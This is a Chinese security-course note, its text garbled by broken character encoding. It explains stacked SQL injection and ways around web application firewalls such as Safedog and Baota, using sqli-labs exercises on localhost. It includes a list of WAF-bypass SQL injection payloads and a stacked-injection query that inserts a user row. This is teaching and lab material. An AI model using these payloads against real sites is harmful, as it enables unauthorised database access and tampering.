![](https://gitee.com/YatJay/image/raw/master/img/202202160922272.png)



# æ¶‰åŠçŸ¥è¯†

## å †å æŸ¥è¯¢æ³¨å…¥

### å®šä¹‰

Stacked injections(å †å æ³¨å…¥)ä»åè¯çš„å«ä¹‰å°±å¯ä»¥çœ‹åˆ°åº”è¯¥æ˜¯**ä¸€å †(å¤šæ¡)SQLè¯­å¥ä¸€èµ·æ‰§è¡Œ**ã€‚è€Œåœ¨çœŸå®çš„è¿ç”¨ä¸­ä¹Ÿæ˜¯è¿™æ ·çš„,æˆ‘ä»¬çŸ¥é“åœ¨MySQLä¸­,ä¸»è¦æ˜¯å‘½ä»¤è¡Œä¸­,æ¯ä¸€æ¡è¯­å¥ç»“å°¾åŠ `;`è¡¨ç¤ºè¯­å¥ç»“æŸã€‚è¿™æ ·æˆ‘ä»¬å°±æƒ³åˆ°äº†æ˜¯ä¸æ˜¯å¯ä»¥å¤šå¥ä¸€èµ·ä½¿ç”¨ã€‚è¿™ä¸ªå«åšstackedinjectionã€‚

### åŸç†

åœ¨SQLä¸­ï¼Œåˆ†å·ï¼ˆ;ï¼‰æ˜¯ç”¨æ¥è¡¨ç¤ºä¸€æ¡sqlè¯­å¥çš„ç»“æŸã€‚è¯•æƒ³ä¸€ä¸‹æˆ‘ä»¬åœ¨ ; ç»“æŸä¸€ä¸ªsqlè¯­å¥åç»§ç»­æ„é€ ä¸‹ä¸€æ¡è¯­å¥ï¼Œä¼šä¸ä¼šä¸€èµ·æ‰§è¡Œï¼Ÿå› æ­¤è¿™ä¸ªæƒ³æ³•ä¹Ÿå°±é€ å°±äº†å †å æ³¨å…¥ã€‚è€Œunion injectionï¼ˆè”åˆæ³¨å…¥ï¼‰ä¹Ÿæ˜¯å°†ä¸¤æ¡è¯­å¥åˆå¹¶åœ¨ä¸€èµ·ï¼Œä¸¤è€…ä¹‹é—´æœ‰ä»€ä¹ˆåŒºåˆ«ä¹ˆï¼ŸåŒºåˆ«å°±åœ¨äºunion æˆ–è€…union allæ‰§è¡Œçš„è¯­å¥ç±»å‹æ˜¯æœ‰é™çš„ï¼Œå¯ä»¥ç”¨æ¥æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ï¼Œè€Œå †å æ³¨å…¥å¯ä»¥æ‰§è¡Œçš„æ˜¯ä»»æ„çš„è¯­å¥ã€‚

### å±€é™æ€§

å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œå¯èƒ½å—åˆ°APIæˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åºã€‚

æ¯”å¦‚MySQLå¯ä»¥å †å æ³¨å…¥ï¼ŒmsSQLå’ŒOracleéƒ½ä¸æ”¯æŒ

### åº”ç”¨åœºæ™¯

æ¯”å¦‚æ³¨å…¥éœ€è¦ç®¡ç†å‘˜è´¦å·å¯†ç ï¼Œå¯†ç æ˜¯åŠ å¯†ï¼Œæ— æ³•è§£å¯†ï¼Œå°±å¯ä»¥ä½¿ç”¨å †å æ³¨å…¥insertè¿›è¡Œæ’å…¥æ•°æ®ï¼Œç”¨æˆ·å¯†ç æ˜¯è‡ªå®šä¹‰çš„ï¼Œå°±èƒ½æ­£å¸¸è§£å¯†ç™»å½•

ä»¥åŠå…¶ä»–åœºæ™¯ï¼Œå†™åœ¨åˆ†å·`;`ä¹‹åçš„SQLè¯­å¥è‡ªå·±å®šä¹‰ï¼Œå…·ä½“æƒ…å†µå…·ä½“å¯¹å¾…

## WAFåŠç»•è¿‡æ€è·¯

![](https://gitee.com/YatJay/image/raw/master/img/202202160926514.png)

### wafw00fé˜²ç«å¢™æ¢æµ‹å·¥å…·

#### å·¥å…·ç®€ä»‹

ç°åœ¨ç½‘ç«™ä¸ºäº†åŠ å¼ºè‡ªèº«å®‰å…¨ï¼Œé€šå¸¸éƒ½ä¼šå®‰è£…å„ç±»é˜²ç«å¢™ã€‚è¿™äº›é˜²ç«å¢™å¾€å¾€ä¼šæ‹¦æˆªå„ç§æ‰«æ è¯·æ±‚ï¼Œä½¿å¾—æµ‹è¯•äººå‘˜æ— æ³•æ­£ç¡®åˆ¤æ–­ç½‘ç«™ç›¸å…³ä¿¡æ¯ã€‚Kali Linux æä¾›äº†ä¸€æ¬¾ç½‘ç«™é˜²ç«å¢™æ¢æµ‹å·¥å…· Wafw00fã€‚å®ƒå¯ä»¥é€šè¿‡å‘é€æ­£å¸¸å’Œå¸¦æ¶æ„ä»£ç çš„ HTTP è¯·æ±‚ï¼Œä»¥æ¢æµ‹ç½‘ç«™æ˜¯å¦å­˜åœ¨é˜²ç«å¢™ï¼Œå¹¶è¯†åˆ«é˜²ç«å¢™çš„ç±»å‹ã€‚

##### WAFW00F æ€ä¹ˆå·¥ä½œ

1. å‘é€æ­£å¸¸çš„ HTTP è¯·æ±‚ï¼Œç„¶ååˆ†æå“åº”ï¼Œè¿™å¯ä»¥è¯†åˆ«å‡ºå¾ˆå¤š WAFã€‚ 

2. å¦‚æœä¸æˆåŠŸï¼Œå®ƒä¼šå‘é€ä¸€äº›ï¼ˆå¯èƒ½æ˜¯æ¶æ„çš„ï¼‰HTTP è¯·æ±‚ï¼Œä½¿ç”¨ç®€å•çš„é€»è¾‘æ¨æ–­æ˜¯å“ªä¸€ ä¸ª WAFã€‚ 

3. å¦‚æœè¿™ä¹Ÿä¸æˆåŠŸï¼Œå®ƒä¼šåˆ†æä¹‹å‰è¿”å›çš„å“åº”ï¼Œä½¿ç”¨å…¶å®ƒç®€å•çš„ç®—æ³•çŒœæµ‹æ˜¯å¦æœ‰æŸä¸ª WAF æˆ–è€…å®‰å…¨è§£å†³æ–¹æ¡ˆå“åº”äº†æˆ‘ä»¬çš„æ”»å‡»

###### å‚æ•°

å®ƒå¯ä»¥æ£€æµ‹å¾ˆå¤š WAFã€‚æƒ³è¦æŸ¥çœ‹å®ƒèƒ½æ£€æµ‹å“ªäº› WAFï¼Œä»¥-l å‚æ•°æ‰§è¡Œ WAFW00F

###### å‘½ä»¤ï¼šwafw00f åŸŸå/IP

![img](https://gitee.com/YatJay/image/raw/master/img/202202161602613.png)

### éƒ¨åˆ† bypass sqlinject payload

```
id=1union/*%00*/%23a%0A/*!/*!select1,2,3*/;%23

id=-1union/*%00*/%23a%0A/*!/*!select%201,database%23x%0A(),3*/;%23

id=-1%20union%20/*!44509select*/%201,2,3%23

id=-1%20union%20/*!44509select*/%201,%23x%0A/*!database*/(),3%23

id=1/**&id=-1%20union%20select%201,2,3%23*/

id=-1%20union%20all%23%0a%20select%201,2,3%23

id=-1%20union%20all%23%0a%20select%201,%230%0Adatabase/**/(),3%23
```



# æ¡ˆä¾‹æ¼”ç¤º

## Sqlilabs-Less38-å †å æ³¨å…¥(å¤šè¯­å¥)

åœ¨æ‰§è¡Œselectæ—¶çš„sqlè¯­å¥ä¸ºï¼š`SELECT * FROM users WHERE id='$id' LIMIT 0,1`

æ­£å¸¸æäº¤idå€¼ï¼š

![](https://gitee.com/YatJay/image/raw/master/img/202202160941491.png)

å¯ä»¥ç›´æ¥æ„é€ å¦‚ä¸‹çš„payloadï¼š

```sql
http://localhost/pentest/sqlilabs/Less-38/index.php?id=1';insert into users(id,username,password) values ('38','less38','hello')--+
```

![](https://gitee.com/YatJay/image/raw/master/img/202202160944412.png)

å†çœ‹æ•°æ®è¡¨ä¸­çš„å†…å®¹ï¼šå¯ä»¥çœ‹åˆ°less38å·²ç»æ·»åŠ 

![](https://gitee.com/YatJay/image/raw/master/img/202202160945085.png)



## WAFéƒ¨ç½²-å®‰å…¨ç‹—,å®å¡”ç­‰wafæ­å»ºéƒ¨ç½²

å®‰å…¨ç‹—ï¼š[ğŸ“safedogfwq_Windows_Help.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/22078880/1628829165383-acc2ec9d-8d4e-4266-b2bb-cce9118fdf0e.pdf)

å®å¡”ï¼šhttps://blog.csdn.net/weixin_43253175/article/details/105752439

ä»¥å·²ç»å®‰è£…å®‰å…¨ç‹—wafçš„sqlli-labs less2ä¸ºä¾‹è¿›è¡ŒWAFç»•è¿‡æµ‹è¯•

![](https://gitee.com/YatJay/image/raw/master/img/202202161559986.png)

ç›´æ¥è¾“å…¥payloadä¼šè¢«æ‹¦æˆªï¼Œæ— æ³•æ³¨å…¥

![](https://gitee.com/YatJay/image/raw/master/img/202202161559875.png)

### åˆ‡æ¢æ•°æ®æäº¤æ–¹å¼ç»•è¿‡WAF

ä½¿ç”¨postæäº¤æ–¹å¼å³å¯ç»•è¿‡ï¼ˆå‰ææ¡ä»¶æ˜¯æºç æ”¯æŒè¯¥æäº¤æ–¹å¼ï¼‰

![](https://gitee.com/YatJay/image/raw/master/img/202202161559623.png)

é¡µé¢æ˜¾ç¤ºä¸æ­£å¸¸ï¼Œæ˜¯å› ä¸ºæœ¬å…³ä»£ç åªæ”¯æŒGETçš„æäº¤æ–¹å¼ï¼Œç»•è¿‡æ€è·¯æ˜¯å¯¹çš„ï¼Œä½†æ˜¯åœ¨æœ¬å…³æ˜¯æ— æ³•æˆåŠŸçš„

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600517.png)

å¦‚æœå°†æœ¬å…³æºç GETæ¥æ”¶å‚æ•°æ”¹ä¸ºPOSTï¼Œåœ¨åˆ¤æ–­å›æ˜¾ä½æ—¶å¯ä»¥æ­£å¸¸æ³¨å…¥

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600998.png)

åœ¨å¯¹å›æ˜¾ä½è¿›è¡Œä¿¡æ¯æŸ¥è¯¢æ—¶ï¼Œå‡ºç°æŠ¥é”™ï¼Œæ˜¯å› ä¸ºå‡ºç°äº†è¿‡æ»¤è¯databaseï¼Œæ˜¯å› ä¸ºå®‰å…¨ç‹—é‡Œé¢çš„æ¼æ´é˜²æŠ¤è§„åˆ™é‡Œæ‰“å¼€äº†é˜²æ­¢æŸ¥è¯¢æ•°æ®åº“ç›¸å…³ä¿¡æ¯çš„è§„åˆ™

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600637.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600420.png)

å°†è¯¥è§„åˆ™å…³é—­ä¹‹åå¯ä»¥æ­£å¸¸æ³¨å…¥

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600188.png)

æ­£å¸¸WAFæ˜¯å¼€ç€çš„ï¼Œè€Œä¸”è¿‡æ»¤æäº¤å‚æ•°çš„æœºåˆ¶ä¸€èˆ¬æ˜¯ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å¯¹æ•æ„Ÿå‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚æœæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…æˆåŠŸï¼Œåˆ™æœ¬æ¬¡å°†æ— æ³•æˆåŠŸæäº¤ã€‚å› æ­¤å¯¹æäº¤æ•°æ®åšä¸€äº›æ”¹åŠ¨ä½¿å…¶ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…å°±æ˜¯ä¸€ç§ç»•è¿‡WAFçš„æ€è·¯ã€‚

![](https://gitee.com/YatJay/image/raw/master/img/202202161600047.png)

è€Œä¸”æœ¬å…³æäº¤`database()`ä¼šè¢«åŒ¹é…æ‹¦æˆªï¼Œæäº¤`database`ã€`()`ä¸ä¼šè¢«åŒ¹é…æ‹¦æˆªã€‚å†æ¬¡å¼€å¯WAFï¼Œé’ˆå¯¹æ‹¦æˆªæ•æ„Ÿæ•°æ®ï¼Œæˆ‘ä»¬å¯ä»¥é’ˆå¯¹æ•°æ®è¿›è¡Œç›¸å…³çš„ç¼–è¯‘ã€‚

MySQLçš„æŸ¥è¯¢è¯­å¥ä¸­å‡ºç°`/**/`ä¸ä¼šå¯¹è¯­å¥æ‰§è¡Œé€ æˆå½±å“ï¼Œæ‰€ä»¥å¯ä»¥åœ¨`database()`å­—ç¬¦ä¸²ä¸­åŠ å…¥ä¸€ä¸ª`/**/`ï¼Œå³æˆä¸º`database/**/()`ï¼Œä»¥ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„åŒ¹é…ã€‚å¯ä»¥çœ‹åˆ°æ³¨å…¥è¯­å¥è¢«æˆåŠŸæ‰§è¡Œã€‚

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600065.png)



å°†æºç æ”¹å›åªå…è®¸GETæ–¹å¼æäº¤å‚æ•°

è¿›è¡Œå°è¯•ï¼Œå‘ç°`union`ä¸è¢«æ‹¦æˆªï¼Œ`select`ä¹Ÿä¸è¢«æ‹¦æˆªã€‚è€Œ`union select`è¢«æ‹¦æˆªï¼Œè¯´æ˜æ˜¯ union selectå…³é”®è¯çš„é—®é¢˜ã€‚

![img](https://gitee.com/YatJay/image/raw/master/img/202202161600956.png)

åŸå› æ˜¯å¼€å¯äº†æ‹¦æˆªè”åˆæŸ¥è¯¢çš„è§„åˆ™

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601378.png)

### ç¼–ç è§£ç ã€æ³¨é‡Šç¬¦æ··ç”¨

#### ä½¿ç”¨%23 %0A

`%23`æ˜¯`# `

`%0A`æ˜¯ä¸€ä¸ªæ¢è¡Œç¬¦

#### åŸç†

\#æ˜¯ä¸ºäº†æ³¨é‡Šæ‰a ï¼Œä½¿ç”¨%0Aæ¢è¡Œæ˜¯ä¸ºäº†å°†unionå’Œselectè¿æ¥èµ·æ¥ã€‚å¦‚æœä¸æ¢è¡Œçš„è¯unionåé¢çš„#ä¼šå°†unionåé¢æ‰€æœ‰çš„è¯­å¥æ³¨é‡Šæ‰

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601376.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601130.png)





![img](https://gitee.com/YatJay/image/raw/master/img/202202161601134.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601278.png)

### å‚æ•°æ±¡æŸ“

åŸç†

/** */ æ³¨é‡Š

è¯­å¥æ²¡æœ‰æ‰§è¡Œ

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601999.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601148.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161601154.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161602620.png)

![img](https://gitee.com/YatJay/image/raw/master/img/202202161602579.png)



##  ç®€è¦è®²è§£å®‰å…¨ç‹—,å®å¡”ç­‰é˜²æŠ¤wafç­–ç•¥è§„åˆ™

[https://blog.csdn.net/cheng1432996862/article/details/100968815?utm_term=waf%E5%B8%B8%E8%A7%81%E8%A7%84%E5%88%99&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-100968815&spm=3001.4430](https://blog.csdn.net/cheng1432996862/article/details/100968815?utm_term=wafå¸¸è§è§„åˆ™&utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~sobaiduweb~default-1-100968815&spm=3001.4430)

## ç®€è¦æ¼”ç¤ºå®‰å…¨ç‹— bypass sqlinject é˜²æŠ¤è§„åˆ™



## å®æµ‹ç®€æ˜“CMSå¤´éƒ¨æ³¨å…¥æ¼æ´BypassåŸç†åˆ†æ



# æ¶‰åŠèµ„æº

https://www.cnblogs.com/backlion/p/9721687.html

https://blog.csdn.net/nzjdsds/article/details/93740686